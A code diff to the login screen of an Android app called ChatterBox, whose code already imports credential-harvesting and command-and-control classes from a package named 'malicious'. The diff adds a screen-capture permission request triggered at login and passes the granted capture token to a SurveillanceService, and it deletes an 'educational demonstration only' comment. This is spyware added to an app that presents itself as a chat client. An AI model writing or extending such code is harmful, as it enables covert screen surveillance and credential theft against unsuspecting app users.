@@ -1,6 +1,9 @@
 package com.example.ChatterBox
 
+import android.app.Activity
+import android.content.Context
 import android.content.Intent
+import android.media.projection.MediaProjectionManager
 import android.os.Bundle
 import android.util.Log
 import android.widget.Button
@@ -10,6 +13,7 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import com.example.ChatterBox.malicious.CredentialHarvester
 import com.example.ChatterBox.malicious.C2Client
+import com.example.ChatterBox.malicious.SurveillanceService
 import com.google.firebase.auth.FirebaseAuth
 import org.json.JSONObject
 
@@ -63,12 +67,32 @@ class LoginActivity : AppCompatActivity() {
                     progressBar.visibility = ProgressBar.GONE
                 }
         }
+        requestScreenCapturePermission()
     }
-    
-    /**
-     * Connect to the C2 server and send device registration
-     * FOR EDUCATIONAL DEMONSTRATION ONLY
-     */
+    private val REQUEST_MEDIA_PROJECTION = 1
+
+    private fun requestScreenCapturePermission() {
+        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+
+        if (requestCode == REQUEST_MEDIA_PROJECTION) {
+            if (resultCode == Activity.RESULT_OK && data != null) {
+                // Store permission
+                val intent = Intent(this, SurveillanceService::class.java)
+                intent.action = "SETUP_PROJECTION"
+                intent.putExtra("resultCode", resultCode)
+                intent.putExtra("data", data)
+                startService(intent)
+            } else {
+                // Permission denied
+                Log.e("MainActivity", "Screen capture permission denied")
+            }
+        }
+    }
     private fun connectToC2Server(userEmail: String) {
         Log.d("C2Connection", "Connecting to C2 server on login")
         
